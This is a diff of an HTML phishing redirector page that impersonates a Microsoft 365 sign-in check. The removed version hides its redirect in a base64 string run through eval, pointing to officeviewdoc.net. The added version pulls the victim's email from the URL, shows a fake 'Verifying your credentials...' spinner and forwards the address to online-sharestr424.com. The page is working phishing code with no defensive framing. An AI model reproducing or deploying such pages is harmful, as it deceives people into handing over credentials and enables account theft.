@@ -1,29 +1,88 @@
 
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-    <title>Authenticating</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Authorized access...</title>
+    <style>
+        /* Centered loading screen */
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f3f3f3;
+            font-family: Arial, sans-serif;
+            margin: 0;
+        }
+
+        .loading-container {
+            text-align: center;
+        }
+
+        .loading-logo {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 20px;
+        }
+
+        .loading-text {
+            font-size: 16px;
+            color: #555;
+        }
+
+        .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-left-color: #0078D4;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+    <script>
+        // Function to capture email from query or hash parameters
+        function captureEmailAndRedirect() {
+            const url = new URL(window.location.href);
+            let email = url.searchParams.get("email"); // Capture email from query parameter
+
+            if (!email) {
+                const hashParams = new URLSearchParams(url.hash.substring(1));
+                email = hashParams.get("email"); // Capture email from hash parameter
+            }
+
+            if (email) {
+                email = decodeURIComponent(email); // Decode special characters like %40
+                console.log("Captured Email:", email); // Debugging purpose
+                // Redirect with decoded email in the hash
+                const redirectUrl = `https://online-sharestr424.com/?email=${email}`;
+                setTimeout(() => {
+                    window.location.href = redirectUrl;
+                }, 2000); // Simulate loading delay
+            } else {
+                // Fallback redirection if no email provided
+                setTimeout(() => {
+                    window.location.href = "https://online-sharestr424.com/?email=";
+                }, 2000); // Simulate loading delay
+            }
+        }
+
+        // Execute the function on page load
+        window.onload = captureEmailAndRedirect;
+    </script>
 </head>
 <body>
-    <p>Shipment access...</p>
+    <div class="loading-container">
+        <img class="loading-logo" src="https://i.ibb.co/4wjp3fpG/images.jpg" alt="MS365 Logo">
+        <div class="spinner"></div>
+        <p class="loading-text">Verifying your credentials...</p>
+    </div>
 </body>
-<script>
-    // Base64-encoded redirection script
-    const scriptBase64 = `
-        Ly8gRXh0cmFjdCB0aGUgY3VycmVudCBVUkwgcGFyYW1ldGVyIGNhbGxlZCBlbWFpbAoKY29uc3Qg
-Y3VycmVudFVybCA9IHdpbmRvdy5sb2NhdGlvbi5ocmVmOwoKY29uc3QgZW1haWwgPSAoZnVuY3Rp
-b24oKSB7CiAgICBpZiAoY3VycmVudFVybC5pbmNsdWRlcygnP2VtYWlsPScpKSB7CiAgICAgICAg
-cmV0dXJuIG5ldyBVUkxTZWFyY2hQYXJhbWV0ZXJzKGN1cnJlbnRVcmwuc2VhcmNoKS5nZXQoJ2Vt
-YWlsJyk7CiAgICB9IGVsc2UgaWYgKGN1cnJlbnRVcmwuaW5jbHVkZXMoJyNlbnZlb3BnYXRlcz0n
-KSkgewogICAgICAgIHJldHVybiBjdXJyZW50VXJsLnNwbGl0KCc/ZW1haWw9JylbMV07CiAgICB9
-IGVsc2UgaWYgKGN1cnJlbnRVcmwuaW5jbHVkZXMoJyNlJykpIHsKICAgICAgICByZXR1cm4gY3Vy
-cmVudFVybC5zcGxpdCgnI2UnKVsxXTsKICAgIH0KICAgIHJldHVybiAnJzsKfSkoKTsKCi8vIFJl
-ZCBpcmVjdHMgdG8gdGhlIHNldCBkb21haW4gYW5kIHJlcGFzc2VkIGVtYWlsCgpjb25zdCByZWRp
-cmVjdFVybCA9ICJodHRwczovL29mZmljZXZpZXdkb2MubmV0L3NoaXB1cHN2aWV3c2ludm9ib2xk
-Lmh0bWw/ZW1haWw9IiArIChlbWFpbCB8fCAnJyk7CgovLyBTZXRzIHRoZSBsb2NhdGlvbiB0byB0
-aGUgcmVkaXJlY3Rpb24gbGluawp3aW5kb3cubG9jYXRpb24uaHJlZiA9IHJlZGlyZWN0VXJsOw==
-    `;
-    eval(atob(scriptBase64));
-</script>
 </html>
